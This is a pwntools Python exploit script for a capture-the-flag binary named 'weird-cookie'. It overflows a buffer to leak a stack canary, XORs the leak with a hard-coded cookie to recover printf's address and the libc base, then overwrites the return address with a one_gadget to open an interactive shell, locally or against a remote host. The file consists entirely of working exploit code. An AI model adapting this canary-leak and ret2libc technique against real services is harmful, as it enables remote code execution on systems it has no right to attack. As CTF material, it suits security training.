#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./weird-cookie_patched")
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

cookie = 0x123456789abcdef1
bss = elf.bss(0x100)

payload = b"A" * 0x28

io.sendafter(b"me?\n", payload)
io.recv(0x28)
canary = u64(io.recv(8))
log.info(f"{canary=:#x}")

# our canary is xored with printf address
leak_printf = canary ^ cookie
log.info(f"{leak_printf=:#x}")

libc.address = leak_printf - libc.symbols["printf"]
one_gadget = libc.address + 0x4f302

payload = b"\x00" * 0x28
payload += p64(canary)
payload += p64(0)
payload += p64(one_gadget)

io.sendafter(b"again.\n", payload)

io.interactive()
